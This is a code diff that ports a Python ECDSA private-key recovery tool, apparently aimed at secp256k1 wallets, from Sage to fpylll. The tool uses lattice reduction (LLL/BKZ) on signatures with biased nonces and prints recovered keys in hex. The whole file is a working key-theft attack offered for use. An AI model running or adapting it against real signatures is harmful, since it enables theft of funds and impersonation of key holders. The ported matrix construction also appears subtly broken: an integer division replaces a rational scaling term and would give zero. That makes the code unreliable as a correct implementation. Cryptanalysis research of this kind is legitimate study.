@@ -1,17 +1,17 @@
 #!/usr/bin/env python
-# Author Dario Clavijo 2020
-# based on previous work:
+# Author: Dario Clavijo (2020)
+# Based on:
 # https://blog.trailofbits.com/2020/06/11/ecdsa-handle-with-care/
 # https://www.youtube.com/watch?v=6ssTlSSIJQE
 
 import sys
 import argparse
 import mmap
-from sage.all_cmdline import *
 import gmpy2
+from fpylll import IntegerMatrix, LLL, BKZ
 
 # Default order from secp256k1 curve
-DEFAULT_ORDER = 115792089237316195423570985008687907852837564279074904382605163141518161494337
+DEFAULT_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
 
 
 def modular_inv(a, b):
@@ -20,13 +20,11 @@ def modular_inv(a, b):
 
 
 def load_csv(filename, limit=None, mmap_flag=False):
-    """Load CSV with ECDSA data, optimized to handle file efficiently (with optional mmap)."""
+    """Load CSV with ECDSA data."""
     msgs, sigs, pubs = [], [], []
-    
-    # Open the file with mmap if requested
+
     if mmap_flag:
         with open(filename, 'r') as f:
-            # Memory map the file for efficient access
             mapped_file = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
             lines = mapped_file.splitlines()
             for n, line in enumerate(lines):
@@ -38,7 +36,6 @@ def load_csv(filename, limit=None, mmap_flag=False):
                 sigs.append((int(R, 16), int(S, 16)))
                 pubs.append(pub)
     else:
-        # Regular file reading without mmap
         with open(filename, 'r') as fp:
             for n, line in enumerate(fp):
                 if limit is not None and n >= limit:
@@ -47,55 +44,57 @@ def load_csv(filename, limit=None, mmap_flag=False):
                 msgs.append(int(Z, 16))
                 sigs.append((int(R, 16), int(S, 16)))
                 pubs.append(pub)
-    
+
     return msgs, sigs, pubs
 
 
-def make_matrix(msgs, sigs, pubs, B, order, matrix_type="dense"):
-    """Construct matrix, either sparse or dense, based on the matrix_type parameter."""
+def make_matrix_fpylll(msgs, sigs, B, order):
+    """
+    Construct IntegerMatrix for fpylll reduction.
+    """
     m = len(msgs)
     m1, m2 = m + 1, m + 2
-    sys.stderr.write(f"Using: {m} sigs...\n")
-    
-    if matrix_type == "sparse":
-        matrix = SparseMatrix(QQ, m2, m2)
-    else:
-        matrix = Matrix(QQ, m2, m2)
+    B2 = 1 << B
+
+    mat = IntegerMatrix(m2, m2)
 
     msgn, rn, sn = msgs[-1], sigs[-1][0], sigs[-1][1]
     mi_sn_order = modular_inv(sn, order)
-    rnsn_inv = rn * mi_sn_order
-    mnsn_inv = msgn * mi_sn_order
+    rnsn_inv = (rn * mi_sn_order) % order
+    mnsn_inv = (msgn * mi_sn_order) % order
 
     for i in range(m):
-        # Fill diagonal with the order
-        matrix[i, i] = order
-        # Set values for the matrix (only first m columns)
         mi_sigi_order = modular_inv(sigs[i][1], order)
-        matrix[m, i] = (sigs[i][0] * mi_sigi_order) - rnsn_inv
-        matrix[m1, i] = (msgs[i] * mi_sigi_order) - mnsn_inv
+        mat[i, i] = order
+        mat[m, i] = int((sigs[i][0] * mi_sigi_order - rnsn_inv) % order)
+        mat[m1, i] = int((msgs[i] * mi_sigi_order - mnsn_inv) % order)
 
-    # Populate last two columns with specific values
-    B2 = 1 << B
-    matrix[m, m1] = B2 / order
-    matrix[m1, m1] = B2
+    mat[m, m1] = B2 // order
+    mat[m1, m1] = B2
 
+    return mat
+
+
+def reduce_matrix(matrix, algorithm="LLL"):
+    if algorithm == "LLL":
+        LLL.reduction(matrix)
+    else:
+        LLL.reduction(matrix)
+        bkz = BKZ(matrix)
+        param = BKZ.Param(block_size=20)
+        bkz(param)
     return matrix
 
 
 def privkeys_from_reduced_matrix(msgs, sigs, pubs, matrix, order, max_rows=20):
     """
-    Extract private keys by:
-      • Precomputing (a,b,cd,ab_list) for all msgs,
-      • Sorting rows by ||row|| ascending,
-      • Testing only the top `max_rows` rows.
+    Try recovering private keys from reduced lattice matrix.
     """
     from math import sqrt
     keys = set()
-    m = len(msgs)    
+    m = len(msgs)
     msgn, rn, sn = msgs[-1], sigs[-1][0], sigs[-1][1]
 
-    # 1) Precompute per-i constants
     params = []
     for i in range(m):
         a = rn * sigs[i][1]
@@ -103,91 +102,66 @@ def privkeys_from_reduced_matrix(msgs, sigs, pubs, matrix, order, max_rows=20):
         c = sn * msgs[i]
         d = msgn * sigs[i][1]
         cd = (c - d) % order
-        if a == b: ab_list = None
-        else: ab_list = [ (a - b) % order, (b - a) % order ]
+        if a == b:
+            ab_list = None
+        else:
+            ab_list = [(a - b) % order, (b - a) % order]
         params.append((b, cd, ab_list))
 
-    # 2) Compute row norms once
     row_norms = []
-    for idx, row in enumerate(matrix):
-        # only consider first m components for the norm
-        norm2 = sum((float(row[j])**2 for j in range(m)))
+    for idx in range(matrix.nrows):
+        norm2 = sum((float(matrix[idx, j]) ** 2 for j in range(m)))
         row_norms.append((norm2, idx))
     row_norms.sort()
 
-    # 3) Only test top max_rows shortest rows
     for _, ridx in row_norms[:max_rows]:
-        row = matrix[ridx]
-        # extract all potential k-diffs at once
-        kdiffs = [int(row[j]) for j in range(m)]
-        # for each message i, attempt recovery
+        row = [int(matrix[ridx, j]) for j in range(m)]
         for i, (b, cd, ab_list) in enumerate(params):
-            base = (cd - b * kdiffs[i])
+            base = (cd - b * row[i])
             if ab_list is None:
-                # special case a==b -> key = base
-                if 0 < base < order: keys.add(base)
-                else: keys.add(base % order)
+                keys.add(base % order)
             else:
                 for ab in ab_list:
-                    # modular_inv only if ab != 0
                     if ab:
                         inv = modular_inv(ab, order)
-                        key = (base * inv)
-                        if 0 < key < order: keys.add(key)
-                        else: keys.add(key % order)
+                        key = (base * inv) % order
+                        keys.add(key)
     return list(keys)
 
 
-
 def display_keys(keys):
-    """Display private keys in hexadecimal format."""
+    """Display recovered private keys."""
     sys.stdout.write("\n".join([f"{key:064x}" for key in keys]) + "\n")
     sys.stdout.flush()
     sys.stderr.flush()
 
 
 def main():
-    """Main function to load data, perform lattice reduction, and display keys."""
-    parser = argparse.ArgumentParser(description="ECDSA private key recovery using lattice reduction")
-    
-    # Command line arguments
-    parser.add_argument("filename", help="CSV file containing the ECDSA messages and signatures")
-    parser.add_argument("B", type=int, help="Parameter B for matrix construction")
-    parser.add_argument("limit", type=int, help="Limit for number of records to process")
+    parser = argparse.ArgumentParser(description="ECDSA private key recovery using lattice reduction (fpylll)")
+    parser.add_argument("filename", help="CSV file containing ECDSA traces")
+    parser.add_argument("B", type=int, help="log2 bound parameter B")
+    parser.add_argument("limit", type=int, help="Limit number of signatures to process")
     parser.add_argument(
-        "--matrix_type", choices=["dense", "sparse"], default="dense",
-        help="Type of matrix to use: 'dense' or 'sparse' (default: dense)"
-    )
-    parser.add_argument(
-        "--order", type=int, default=DEFAULT_ORDER, 
-        help="Order of the curve. Default is the secp256k1 order"
+        "--order", type=int, default=DEFAULT_ORDER,
+        help="Curve order (default: secp256k1)"
     )
     parser.add_argument(
         "--reduction", choices=["LLL", "BKZ"], default="LLL",
-        help="Reduction algorithm: LLL (default) or BKZ"
+        help="Lattice reduction algorithm (default: LLL)"
     )
     parser.add_argument(
-        "--mmap", action="store_true", 
-        help="Enable memory-mapping for the CSV file for faster processing"
+        "--mmap", action="store_true",
+        help="Enable mmap for fast CSV access"
     )
 
-    # Parse arguments
     args = parser.parse_args()
 
-    # Load messages, signatures, and public keys with optional mmap
     msgs, sigs, pubs = load_csv(args.filename, limit=args.limit, mmap_flag=args.mmap)
+    sys.stderr.write(f"Using: {len(msgs)} sigs...\n")
 
-    # Construct matrix for lattice reduction
-    matrix = make_matrix(msgs, sigs, pubs, args.B, args.order, matrix_type=args.matrix_type)
-
-    # Perform LLL or BKZ reduction
-    if args.reduction == "LLL":
-        new_matrix = matrix.LLL(early_red=True, use_siegel=True)
-    else:
-        new_matrix = matrix.BKZ(early_red=True, use_siegel=True)
-
-    # Extract and display private keys
-    keys = privkeys_from_reduced_matrix(msgs, sigs, pubs, new_matrix, args.order)
+    matrix = make_matrix_fpylll(msgs, sigs, args.B, args.order)
+    matrix = reduce_matrix(matrix, algorithm=args.reduction)
+    keys = privkeys_from_reduced_matrix(msgs, sigs, pubs, matrix, args.order)
     display_keys(keys)
 
 
